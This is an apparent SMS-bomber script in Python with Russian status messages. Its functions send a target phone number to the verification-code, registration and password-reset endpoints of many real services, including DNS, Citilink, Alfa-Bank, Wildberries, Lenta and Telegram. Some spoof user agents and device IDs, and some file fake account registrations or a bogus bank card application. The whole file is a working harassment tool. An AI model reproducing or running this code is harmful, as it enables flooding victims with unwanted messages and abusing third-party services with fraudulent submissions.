# Post запросы:
from requests import post
from user_agent import generate_user_agent
from random import randint
import time
def mv(number,n=1):
    for _ in range(n):
        r = post('https://mv.com.ru/api/v1/send-code', data={'phone': f"{number}"})
        if r.status_code == 200:
            return '✅ Мир Возможностей отправлено'
        else:
            return '⚠️ Мир Возможностей не отправлено'
        time.sleep(1)

def dns(number,n=1,is_call =0):
    for i in range(n):
        r = post("https://www.dns-shop.ru/auth/auth/fast-authorization/",
                 data={"FastAuthorizationLoginLoadForm[login]:": f"{number}",
                       "FastAuthorizationLoginLoadForm[token]": "",
                       "FastAuthorizationLoginLoadForm[isPhoneCall]": is_call})
        if r.status_code == 200:
            return '✅ DNS отправлено'
        else:
            return '⚠️ DNS не отправлено'
        if i != n-1:
            time.sleep(30)

def sm_center(number,n=1):
    f_number = format_phone(number, "+# (###) ### ## ##")
    for _ in range(n):
        r = post('https://api.sm-center.ru/vremya/Auth/SendCheckCode',
                 json={"phone": f_number})
        if r.status_code == 200:
            return '✅ Наш дом отправлено'
        else:
            return '⚠️ Наш дом не отправлено '

def citilink(number,n=1):
    for _ in range(n):
        r = post('https://www.citilink.ru/registration/confirm/phone/+' + number + '/')
        if r.status_code == 200:
            return '✅ Ситилинк отправлено'
        else:
            return '⚠️ Ситилинк не отправлено'


def gorpay(number,n=1):
    for _ in range(n):
        r = post('https://api.gorpay.online/profile/Register/SendSmsCode2',
                 data={'PhoneNumber': number, 'SmsCodeReason': 'Registration'})
        if r.status_code == 200:
            return '✅ Регистрация Gorpay отправлено'
        else:
           return '⚠️ Регистрация Gorpay не отправлено'
        r = post('https://api.gorpay.online/profile/Register/SendOtpCode2',
                 data={'PhoneNumber': number, 'OtpCodeReason': 'ResetPassword', 'OtpProviderType': 'Sms'})
        if r.status_code == 200:
            return '✅ Востановление пароля Gorpay отправлено'
        else:
            return '⚠️ Востановление пароля Gorpay не отправлено'


def moe_online(number,n=1):
    for _ in range(n):
        r = post('https://moe-online.ru/register',
                 data={'number_phone': number,
                       'password': '123456', 'approv': True,
                       'name': 'WEFWEF', '_method': 'POST'})
        if r.status_code == 200:
            return '✅ moe-online отправлено'
        else:
            return '⚠️ moe-online не отправлено'


def avon(number,n=1):
    f_number = format_phone(number, "+###########")
    for _ in range(n):
        r = post('https://avon.ru/api/authentication_code', json={'phone': f_number, 'channel': 'SMS'})
        if r.status_code == 200:
            return '✅ Avon отправлено'
        else:
            return '⚠️ Avon не отправлено'


def alfabank(number,n=1):
    for _ in range(n):
        r = post('https://alfabank.ru/api/v1/form-sender-dc/v2/applications',
                 json={'cardId': 'RR', 'packageId': 'T04', 'contractId': 'PDRR', 'email': 'ch@ya.ru',
                       'embossingName': 'BB AA', 'firstName': 'Бб', 'lastName': 'Аа', 'middleName': 'Вв',
                       'passportBirthDate': '2000-01-01', 'mobilePhone': number[-10:], 'sex': 'm',
                       'sopdConfirmed': True, 'additionalServices': [], 'abTest': '',
                       'platformId': 'alfaonline_unauth_dc_newp'},
                 headers={'referer': 'https://alfabank.ru/lp/retail/debit/promo/dcnewclients/'})
        if r.status_code == 200:
            return '✅ Alpha-Bank отправлено'
        else:
            return '⚠️ Alpha-Bank не отправлено'


def zaymer(number,n=1):
    for _ in range(n):
        r = post('https://www.zaymer.ru/api/v3/registration/otp', json={"phone": int(number)})
        if r.status_code == 200:
            return '✅ Займер отправлено'
        else:
            return '⚠️ Займер не отправлено'


def lenta(number,n=1):
    for _ in range(n):
        headers = {'User-Agent': generate_user_agent(), "DeviceID": "3ea24583-84da-1bd8-005d-2b9f11bf0df3",
                   "X-Platform": "omniweb", "X-Retail-Brand": "lo"}
        r = post('https://lenta.com/api-gateway/v1/auth/code/send', json=
        {"acceptMarketingCommunications": True,
         "kfpKsid": "ca3289f7-4e00-4d2d-8d81-f2de9f0ad17e",
         "kfpVn": None,
         "phone": number}, headers=headers)
        if r.status_code == 200 and r.json().get('sent'):
            return '✅ Лента отправлено'
        else:
            return '⚠️ Лента не отправлено'


def wildberries(number,n=1):
    for _ in range(n):
        headers = {'User-Agent': generate_user_agent(),
                   "deviceid": f'site_{randint(10000, 99999)}as9232145d0ad4a88be4125350c'}
        r = post('https://wbx-auth.wildberries.ru/v2/code/wb-captcha',
                 json={"phone_number": number, "captcha_token": ''}, headers=headers)
        if r.status_code == 200:
            return '✅ Wildberries отправлено'
        else:
            return '⚠️ Wildberries не отправлено'


def kviku(number,n=1):
    f_number = format_phone(number, "+#-###-###-####")
    for _ in range(n):
        r = post('https://kviku.ru/cards/default/SendCodeApproveDocs', data={'phone': f_number})
        if r.status_code == 200 and r.json().get('status') == 'success':
            return '✅ kviku отправлено'
        else:
            return '⚠️ kviku не отправлено'


def telegram(number,n=1):
    f_number = format_phone(number, "+###########")
    for _ in range(n):
        r = post("https://my.telegram.org/auth/send_password", data={"phone": f_number})
        if r.status_code == 200 and r.text != 'Sorry, too many tries. Please try again later.':
            return '✅ Telegram отправлено'
        else:
            return '⚠️ Telegram не отправлено'


def mm(number,n =1):
    for _ in range(n):
        r = post('https://api.business.kazanexpress.ru/api/restore', json={"login": number[1:]})
        if r.status_code == 200 and r.text:
            return '✅ Магнит Маркет отправлено'
        else:
            return '⚠️ Магнит Маркет не отправлено'



# Изменение формата номера
def format_phone(phone, phone_mask):
    phone_list = list(phone)
    for i in phone_list:
        phone_mask = phone_mask.replace("#", i, 1)
    return phone_mask
